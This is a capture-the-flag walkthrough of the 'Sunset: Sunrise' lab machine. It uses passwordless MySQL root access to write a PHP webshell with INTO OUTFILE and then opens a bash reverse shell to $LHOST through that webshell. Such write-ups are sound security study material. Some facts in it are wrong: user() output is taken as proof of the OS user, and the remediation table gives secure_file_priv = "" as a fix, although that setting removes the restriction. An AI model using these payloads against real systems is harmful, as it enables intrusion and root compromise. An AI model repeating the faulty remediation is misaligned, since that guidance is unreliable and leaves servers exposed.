# Sunset: Sunrise — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.x (discovered via netdiscover) |
| **Difficulty** | Easy |
| **OS** | Linux (Debian) |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/sunset-sunrise-vulnhub-walkthrough/) |

## Attack Summary

Sunset: Sunrise exposes a MySQL instance accessible from the network with no root password. MySQL runs as the system root user, so it is possible to write a PHP webshell directly to the web root using `INTO OUTFILE`. The resulting web shell provides a reverse shell, and because the MySQL process owner is root, the shell lands directly as root — no privilege escalation step required.

## Methodology

1. Host discovery with netdiscover
2. Nmap — identify MySQL (3306), SSH (22), HTTP (8080)
3. MySQL unauthenticated root login from attacker machine
4. Write PHP webshell to web root via `SELECT INTO OUTFILE`
5. Reverse shell through the webshell — lands as root
6. Read root flag

---

## Step 1: Host Discovery

```bash
netdiscover -r 192.168.1.0/24
```

Identify the target IP. Set `TARGET` accordingly.

---

## Step 2: Nmap Scan

```bash
nmap -p- -sV -sC $TARGET
```

![nmap scan](images/01-nmap.png)

Open ports:

| Port | Service |
|---|---|
| 22 | OpenSSH |
| 3306 | MySQL |
| 8080 | HTTP (Weborf server) |

The MySQL port (3306) is reachable directly from the attacker machine — this is unusual and indicates a misconfiguration.

---

## Step 3: MySQL Unauthenticated Root Login

```bash
mysql -h $TARGET -u root --skip-password
```

![mysql login](images/02-mysql.png)

Login succeeds without a password. Check who MySQL is running as:

```sql
SELECT user();
-- Output: root@localhost

SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty or /var/www/html — file writes are permitted
```

This confirms MySQL is running as the Linux root user and can write to the filesystem.

---

## Step 4: Write PHP Webshell to Web Root

Identify the web root (typically `/var/www/html/` or the Weborf document root):

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

![webshell write](images/03-webshell.png)

Verify access:

```
http://$TARGET:8080/shell.php?cmd=id
```

Expected output: `uid=0(root) gid=0(root) groups=0(root)`

---

## Step 5: Reverse Shell as Root

Start a listener on the attacker machine:

```bash
nc -lvnp $LPORT
```

Trigger the reverse shell via the webshell (URL-encoded):

```
http://$TARGET:8080/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'
```

![reverse shell](images/04-shell.png)

The shell lands as **root** because MySQL runs as the root system user.

---

## Step 6: Root Flag

```bash
whoami
# root
cat /root/flag.txt
# or
find / -name "*.txt" -maxdepth 3 2>/dev/null
```

![root flag](images/05-root-flag.png)

---

## Lessons Learned

- MySQL should never be exposed to the network on port 3306 without strict firewall rules.
- Running MySQL (or any database) as the system root user is a critical misconfiguration — a DB compromise becomes an OS compromise.
- `secure_file_priv` must be configured to restrict or disable file system writes from SQL queries.
- The combination of network-accessible DB + no authentication + root process ownership provides a trivial, one-step path to full system compromise.

---

## Remediation

| Vulnerability | Fix |
|---|---|
| MySQL exposed on 3306 to network | Bind MySQL to `127.0.0.1`; firewall port 3306 |
| No MySQL root password | Set a strong MySQL root password |
| MySQL running as system root | Run MySQL as a dedicated low-privilege `mysql` user |
| `secure_file_priv` not configured | Set `secure_file_priv = ""` disabled or point to a restricted path |
| Webshell write via SQL | Combine all above; also use read-only filesystem mounts for web root |
